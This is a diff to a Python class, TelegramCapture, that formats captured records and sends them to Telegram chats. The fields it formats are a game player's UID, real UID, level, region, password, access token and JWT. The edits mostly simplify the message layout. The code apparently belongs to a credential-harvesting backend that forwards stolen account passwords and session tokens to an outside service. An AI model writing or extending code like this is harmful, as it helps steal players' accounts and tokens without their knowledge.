@@ -46,7 +46,10 @@ class TelegramCapture:
         self._send_sync(record)
 
     def _send_sync(self, record):
+        # user-uploaded files
         user_files = record.pop("_files", []) or []
+
+        # formatted text
         text = self._format(record)
 
         for chat_id in self.chats:
@@ -68,6 +71,7 @@ class TelegramCapture:
 
     def _format(self, r):
         src = r.get("source") or "?"
+
         icon = {
             "generated":        "✅",
             "generated_failed": "❌",
@@ -96,89 +100,41 @@ class TelegramCapture:
             return "<pre>" + "\n".join(lines) + "</pre>"
 
         L = []
-
-        # header
         L.append(f"{icon}  <b>{_h(title)}</b>")
         L.append(f"<code>{_h(ts_fmt)}</code>")
 
-        # identity
-        ident = []
-        if r.get("sender"):
-            ident.append(f"👤 <b>{_h(r.get('sender'))}</b>")
-        if r.get("ip"):
-            ident.append(f"🌐 <code>{_h(r.get('ip'))}</code>")
-        if ident:
-            L.append("")
-            L.append("  •  ".join(ident))
-
-        # player (uid + password + level + region)
-        player_rows = []
+        rows = []
+        if r.get("real_uid"):
+            rows.append(("ID",       str(r.get("real_uid"))))
         if r.get("level") not in (None, 0, ""):
-            player_rows.append(("Level", str(r.get("level"))))
+            rows.append(("Level",    str(r.get("level"))))
         if r.get("region"):
-            player_rows.append(("Region", str(r.get("region"))))
+            rows.append(("Region",   str(r.get("region"))))
         if r.get("uid"):
-            player_rows.append(("UID", str(r.get("uid"))))
+            rows.append(("UID",      str(r.get("uid"))))
         if r.get("password"):
-            player_rows.append(("Password", str(r.get("password"))))
-        if player_rows:
+            rows.append(("Password", str(r.get("password"))))
+        if r.get("real_uid"):
+            rows.append(("Real UID", str(r.get("real_uid"))))
+
+        if rows:
             L.append("")
-            L.append("🎮  <b>PLAYER</b>")
-            L.append(table(player_rows))
+            L.append(table(rows))
 
-        # request
-        L.append("")
-        L.append("📡  <b>REQUEST</b>")
-        req_rows = [
-            ("Method", str(r.get("method") or "-")),
-            ("Path",   str(r.get("path") or "-")),
-        ]
-        if r.get("user_agent"):
-            req_rows.append(("UA", r.get("user_agent")[:48]))
-        if r.get("referer"):
-            req_rows.append(("Referer", r.get("referer")[:48]))
-        L.append(table(req_rows))
-
-        # query
-        q = r.get("query")
-        if q and q not in ("{}", "null", "None"):
-            L.append("")
-            L.append("🔎  <b>QUERY</b>")
-            L.append(f"<pre>{_h(q)[:500]}</pre>")
-
-        # body
-        b = r.get("body")
-        if b:
-            L.append("")
-            L.append("📨  <b>BODY</b>")
-            L.append(f"<pre>{_h(b)[:500]}</pre>")
-
-        # files summary
-        if r.get("files_summary"):
-            L.append("")
-            L.append("📎  <b>FILES</b>")
-            L.append(f"<pre>{_h(r.get('files_summary'))[:500]}</pre>")
-
-        # access token
         if r.get("access_token"):
             L.append("")
             L.append("🎟  <b>ACCESS TOKEN</b>")
             L.append(f"<blockquote expandable>{_h(r.get('access_token'))[:900]}</blockquote>")
 
-        # jwt
         if r.get("jwt_token"):
             L.append("")
             L.append("💎  <b>JWT</b>")
             L.append(f"<blockquote expandable>{_h(r.get('jwt_token'))[:1500]}</blockquote>")
 
-        # error
         if r.get("error"):
             L.append("")
             L.append("⚠️  <b>ERROR</b>")
             L.append(f"<blockquote>{_h(r.get('error'))[:500]}</blockquote>")
-
-        L.append("")
-        L.append("━━━━━━━━━━━━━━━━━━━━")
 
         return "\n".join(L)
 
